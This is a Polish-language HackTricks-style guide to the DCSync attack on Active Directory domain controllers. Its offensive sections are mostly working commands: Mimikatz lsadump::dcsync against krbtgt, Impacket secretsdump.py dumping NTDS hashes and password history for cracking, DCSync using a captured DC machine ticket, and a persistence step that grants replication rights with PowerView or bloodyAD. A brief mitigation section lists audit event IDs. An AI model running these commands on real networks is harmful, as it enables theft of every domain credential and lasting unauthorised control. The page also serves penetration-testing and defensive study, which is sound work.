# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Uprawnienie **DCSync** oznacza posiadanie następujących uprawnień w domenie: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** oraz **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Ważne informacje dotyczące DCSync:**

- **Atak DCSync symuluje działanie kontrolera domeny i żąda od innych kontrolerów domeny replikacji informacji** przy użyciu Directory Replication Service Remote Protocol (MS-DRSR). Ponieważ MS-DRSR jest prawidłową i niezbędną funkcją Active Directory, nie można go wyłączyć ani dezaktywować.
- Domyślnie tylko grupy **Domain Admins, Enterprise Admins, Administrators oraz Domain Controllers** mają wymagane uprawnienia.
- W praktyce **pełny DCSync** wymaga uprawnień **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** w kontekście nazewnictwa domeny. `DS-Replication-Get-Changes-In-Filtered-Set` jest często delegowane razem z nimi, ale samo w sobie ma większe znaczenie dla synchronizowania **atrybutów poufnych / filtrowanych przez RODC** (na przykład sekretów w stylu starszego LAPS) niż dla pełnego zrzutu krbtgt.<sup>[[2]](#references)</sup>
- Jeśli hasła niektórych kont są przechowywane z użyciem szyfrowania odwracalnego, w Mimikatz dostępna jest opcja zwracania hasła w postaci jawnego tekstu.

### Enumeracja

Sprawdź, kto ma te uprawnienia, używając `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Jeśli chcesz skupić się na **niestandardowych podmiotach** z uprawnieniami DCSync, odfiltruj wbudowane grupy zdolne do replikacji i przeanalizuj tylko nieoczekiwanych właścicieli uprawnień:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Eksploatuj lokalnie
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploituj zdalnie
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktyczne przykłady o określonym zakresie:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync przy użyciu przechwyconego TGT maszyny DC (ccache)

W scenariuszach `unconstrained-delegation` w trybie eksportu możesz przechwycić TGT maszyny Domain Controller (np. `DC1$@DOMAIN` dla `krbtgt@DOMAIN`). Następnie możesz użyć tego ccache do uwierzytelnienia jako DC i wykonania DCSync bez hasła.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Uwagi operacyjne:

- **Ścieżka Kerberos w Impacket najpierw korzysta z SMB**, a dopiero potem wykonuje wywołanie DRSUAPI. Jeśli środowisko wymusza **SPN target name validation**, pełny dump może się nie powieść z komunikatem `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- W takim przypadku najpierw poproś o ticket usługi **`cifs/<dc>`** dla docelowego DC albo użyj **`-just-dc-user`** dla konta, którego potrzebujesz natychmiast.
- Gdy masz tylko niższe uprawnienia do replikacji, synchronizacja w stylu LDAP/DirSync nadal może ujawnić atrybuty **confidential** lub **RODC-filtered** (na przykład starszy `ms-Mcs-AdmPwd`) bez pełnej replikacji krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` generuje 3 pliki:

- jeden z **hashami NTLM**
- jeden z **kluczami Kerberos**
- jeden z hasłami w cleartext z NTDS dla wszystkich kont, dla których włączono [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Użytkowników z włączonym reversible encryption można uzyskać za pomocą

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Jeśli jesteś administratorem domeny, możesz nadać te uprawnienia dowolnemu użytkownikowi za pomocą `powerview`:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Operatorzy systemu Linux mogą zrobić to samo za pomocą `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Następnie możesz **sprawdzić, czy użytkownikowi poprawnie przypisano** 3 uprawnienia, wyszukując je w wynikach (powinny być widoczne nazwy uprawnień w polu „ObjectType”):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Łagodzenie

- Security Event ID 4662 (Audit Policy for object must be enabled) – Wykonano operację na obiekcie<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – Zmodyfikowano obiekt usługi katalogowej
- Security Event ID 4670 (Audit Policy for object must be enabled) – Zmieniono uprawnienia obiektu
- AD ACL Scanner - Tworzenie i porównywanie raportów ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Odnośniki

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Wykorzystanie replikacji Get-Changes i Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Zrzucanie hashy haseł z kontrolera domeny](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — Dane uwierzytelniające SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
